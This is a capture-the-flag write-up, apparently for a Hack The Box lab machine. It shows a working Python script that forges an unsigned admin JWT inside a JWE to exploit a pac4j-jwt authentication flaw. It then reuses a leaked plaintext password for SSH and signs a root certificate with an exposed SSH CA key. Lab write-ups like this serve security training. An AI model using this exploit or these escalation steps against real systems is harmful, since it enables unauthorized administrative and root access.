---
layout: post
title: Principal - CTF
date: 2026-03-14
pid: "0214"
category: "CTFs"
difficulty: "MEDIUM"
description: "Bypassing pac4j-jwt authentication with a forged JWE token and exploiting SSH Certificate Authorities for root access"
tags: [HTB, Linux, SSH, JWT]
---
### 1. Overview
This challenge involved exploiting a vulnerability in the authentication system of a web application in order to gain administrative access. After bypassing the login system, sensitive credentials were discovered within the application dashboard which allowed SSH access to the machine. From there, privilege escalation was achieved by abusing an exposed SSH certificate authority key to generate a signed key for the root user.

### 2. Enum
My first step was to run a standard service and version scan using Nmap to see what services were exposed.
```
└─$ nmap -sCV 10.129.244.220 --min-rate 5000 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 19:00 -0400
Nmap scan report for 10.129.244.220
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-server-header: Jetty
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 14 Mar 2026 23:00:44 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
...[SNIP]...
```

The scan found two open ports:

- **22** running SSH
- **8080** running a web server powered by **Jetty**

The http responses also included the header:
```
X-Powered-By: pac4j-jwt/6.0.3
```

This indicated the server was using the `pac4j-jwt` library.
### 2.1 Web Enum
Since there was a web service, my next step was to inspect the website itself. To learn more about the client-side Javascript, I looked at the main `app.js` code used by the site:
```
└─$ curl -s http://10.129.4.116:8080/static/js/app.js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';
...[SNIP]...
```

From this information it became clear that authentication relied on **JWT tokens** wrapped inside **JWE encryption**. The server's public key could also be retrieved from the following endpoint:
```
/api/auth/jwks
```

Curling that endpoint returned the RSA key used by the application.
```
└─$ curl http://10.129.4.116:8080/api/auth/jwks | jq .
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"                                                                                                         
    }
  ]
}
```
### 3. Foothold
After identifying the technology stack, I searched for known vulnerabilities affecting the version of **pac4j-jwt** used by the application. This led to **CVE-2026-29000**, which allows an attacker to forge authentication tokens.

Using this vulnerability, it is possible to:

1. Retrieve the server's public key from the JWKS endpoint
2. Create a custom JWT with administrator privileges
3. Encrypt the token as a JWE using the public key
4. Use the forged token to authenticate as an admin user

To automate this process, I wrote the following Python script.
```
#!/usr/bin/env python3

import json

import time

import base64

import requests

from jwcrypto import jwk, jwe

import sys

  

TARGET = sys.argv[1]

  

print("[*] Fetching JWKS...")

  

resp = requests.get(f"{TARGET}/api/auth/jwks")

jwks_data = resp.json()

key_data = jwks_data['keys'][0]

pub_key = jwk.JWK(**key_data)

  

print(f"[+] Got RSA public key (kid: {key_data['kid']})")

  

def b64url_encode(data):

return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

  

now = int(time.time())

header = b64url_encode(json.dumps({"alg": "none"}).encode())

payload = b64url_encode(json.dumps({

"sub": "admin",

"role": "ROLE_ADMIN",

"iss": "principal-platform",

"iat": now,

"exp": now + 3600

}).encode())

  

plain_jwt = f"{header}.{payload}."

print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")

  

jwe_token = jwe.JWE(

plain_jwt.encode(),

recipient=pub_key,

protected=json.dumps({

"alg": "RSA-OAEP-256",

"enc": "A128GCM",

"kid": key_data['kid'],

"cty": "JWT"

})

)

forged_token = jwe_token.serialize(compact=True)

print(f"[+] Forged JWE token created")

  

headers = {"Authorization": f"Bearer {forged_token}"}

print("\n[*] Accessing /api/dashboard...")

resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)

print(f"[+] Status: {resp.status_code}")

data = resp.json()

print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")

print(f"[+] Token: {forged_token}")
```

Running the script generated a valid authentication token with admin privileges.
```
└─$ python3 jwt.py http://10.129.4.116:8080
Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkpXVCJ9.SFxhAqrS8Tc5BcjuzHff_bORTozFOIxP5Uewg5_po5iltes_1JY9-7s914JrKXzCnCedbXWprbIiVLG8oxlIccdDh3A6D0xUdtPkD4im9K7JZhIcPukR-qtsFFMdESxWJkfpltf8GKkHI4k1DglNtTLFXs3QbxipNSrmsQTguK0xADPi3ugmD_o0UJdumW_FjPsnHJancL0bDX18NZLNkD6cevllO_GycCHXwoaggRmb63F4ZLm5SW8AzW-kZEbDvnN0ITK4C-HImaiAW1IuHG4KULJOz21DkzPpv1Ra9o3eNVHpi8eBUWgVBBnGdaHf0paycaOU6IDWg65Jvbuw4g.E-N4eNemkf7tsv13.jEykHeaLrHxz7hpp21bWQxtGW0ZcgPu40XlN0B8XHy06CxZMG6YFP1AHDeruTP9DPIQVIXAJ3WFwEOmekKHu9F0zB6UBbgRUeuW7GinyZwfarbNHTzNQWrEh3mablLCnU456BanRdpcXjFLfVlLv6RruWR-Ita_5aigOqJBhOBR-ujmPbi1Ka8LR-cNcIW_ivCjn6wVBPfV2UaO0ZBzuL9DP.0m49W7Bv7nBK5TocCG64OA
```

To use the token in the web interface, it needed to be placed into the browser's **session storage** under the key: `auth_token`.

After setting the value manually in the browser, the login page was bypassed and the administrative dashboard became accessible. While exploring the dashboard, I discovered a plaintext encryption key stored in the **settings panel**:
```
D3pl0y_$$H_Now42!
```

The users tab also listed an account named:
```
svc-deploy
```

Since service accounts often share related credentials, I tried to use this key as the password for the `svc-deploy` user over SSH and the login succeeded.
### 4. Root
After gaining access as `svc-deploy`, I started checking common privilege escalation paths. Running `sudo -l` showed that the user did not have any sudo permissions, so I moved on to looking through the filesystem for interesting files.

One common location for application files is `/opt`, so I checked there first.
```
svc-deploy@principal:~$ ls /opt/principal/
app  deploy  ssh
```

The `ssh` folder was interesting, so I looked into it:
```
svc-deploy@principal:~$ ls /opt/principal/ssh/
README.txt  ca  ca.pub
```

The presence of a **CA key** suggested that the system was using **SSH certificate authentication**. If the private CA key could be used to sign a key for the root user, it might be possible to authenticate as root.

First, I generated a new SSH key pair.
```
svc-deploy@principal:~$ ssh-keygen -t ed25519 -f /tmp/id_rsa
```

Next, I used the CA key to sign the public key and assign it to the **root** user.
```
svc-deploy@principal:~$ ssh-keygen -s /opt/principal/ssh/ca -I HeHe -n root -V +1h /tmp/id_rsa.pub
Signed user key /tmp/id_rsa-cert.pub: id "HeHe" serial 0 for root valid from 2026-03-15T01:11:00 to 2026-03-15T02:12:31
```

With the signed key created, I tried to connect to the local SSH server as root and it worked.
```
svc-deploy@principal:~$ ssh -i /tmp/id_rsa root@127.0.0.1
...[SNIP]...
root@principal:~# 
```

### 5. Conclusion
Initial access was achieved by abusing a vulnerability in the pac4j-jwt authentication implementation to create a forged admin token. This allowed direct access to the application's admin dashboard.

Sensitive information exposed in the dashboard included a plaintext key that matched the `svc-deploy` service account, which provided SSH access to the system. Once on the host, application files revealed an SSH certificate authority key. Signing a newly generated key for the root account allowed authentication as root and resulted in full system access.
